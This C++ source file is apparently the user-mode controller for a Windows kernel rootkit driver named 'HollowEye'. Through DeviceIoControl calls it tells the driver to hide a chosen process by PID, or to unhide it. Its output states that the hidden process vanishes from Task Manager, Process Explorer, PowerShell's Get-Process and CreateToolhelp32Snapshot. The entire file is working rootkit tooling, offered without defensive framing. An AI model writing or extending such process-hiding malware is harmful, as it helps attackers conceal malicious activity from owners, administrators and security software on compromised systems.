#include <windows.h>
#include <iostream>
#include <string>
#include "../shared/shared.h"

class DriverController {
private:
    HANDLE hDevice;

public:
    DriverController() : hDevice(INVALID_HANDLE_VALUE) {}

    ~DriverController() {
        Close();
    }

    bool Open() {
        hDevice = CreateFileW(
            RK_DEVICE_NAME,
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr);

        if (hDevice == INVALID_HANDLE_VALUE) {
            std::wcerr << L"[!] Failed to open device: 0x" 
                      << std::hex << GetLastError() << std::dec << std::endl;
            std::wcerr << L"[!] Make sure the driver is loaded (sc start HollowEye)" << std::endl;
            return false;
        }

        return true;
    }

    void Close() {
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            hDevice = INVALID_HANDLE_VALUE;
        }
    }

    bool SendIOCTL(DWORD ioctl, PVOID input, DWORD inputSize) {
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::wcerr << L"[!] Device not opened" << std::endl;
            return false;
        }

        DWORD bytesReturned = 0;
        BOOL result = DeviceIoControl(
            hDevice,
            ioctl,
            input,
            inputSize,
            nullptr,
            0,
            &bytesReturned,
            nullptr);

        if (!result) {
            std::wcerr << L"[!] DeviceIoControl failed: 0x" 
                      << std::hex << GetLastError() << std::dec << std::endl;
            return false;
        }

        return true;
    }

    bool HideProcess(ULONG pid) {
        RK_HIDE_INPUT input = { pid };

        if (!SendIOCTL(RK_CTL_HIDE, &input, sizeof(input))) {
            return false;
        }

        std::wcout << L"[+] Successfully sent hide command for PID " << pid << std::endl;
        std::wcout << L"[+] Process should now be hidden from:" << std::endl;
        std::wcout << L"    - Task Manager" << std::endl;
        std::wcout << L"    - Process Explorer" << std::endl;
        std::wcout << L"    - Get-Process (PowerShell)" << std::endl;
        std::wcout << L"    - CreateToolhelp32Snapshot" << std::endl;
        return true;
    }

    bool UnhideProcess() {
        if (!SendIOCTL(RK_CTL_UNHIDE, nullptr, 0)) {
            return false;
        }

        std::wcout << L"[+] Successfully sent unhide command" << std::endl;
        return true;
    }
};

void PrintUsage() {
    std::wcout << L"Process Hider Controller" << std::endl;
    std::wcout << L"Usage:" << std::endl;
    std::wcout << L"  controller.exe hide <PID>    - Hide process by PID" << std::endl;
    std::wcout << L"  controller.exe unhide        - Unhide current hidden process" << std::endl;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        PrintUsage();
        return 1;
    }

    std::wstring command(argv[1]);
    
    for (auto& c : command) {
        c = towlower(c);
    }

    DriverController controller;
    if (!controller.Open()) {
        return 1;
    }

    if (command == L"hide") {
        if (argc < 3) {
            std::wcerr << L"[!] Missing PID argument" << std::endl;
            PrintUsage();
            return 1;
        }

        ULONG pid = wcstoul(argv[2], nullptr, 10);
        if (pid == 0) {
            std::wcerr << L"[!] Invalid PID" << std::endl;
            return 1;
        }

        return controller.HideProcess(pid) ? 0 : 1;
    }
    else if (command == L"unhide") {
        return controller.UnhideProcess() ? 0 : 1;
    }
    else {
        std::wcerr << L"[!] Unknown command: " << command << std::endl;
        PrintUsage();
        return 1;
    }
}
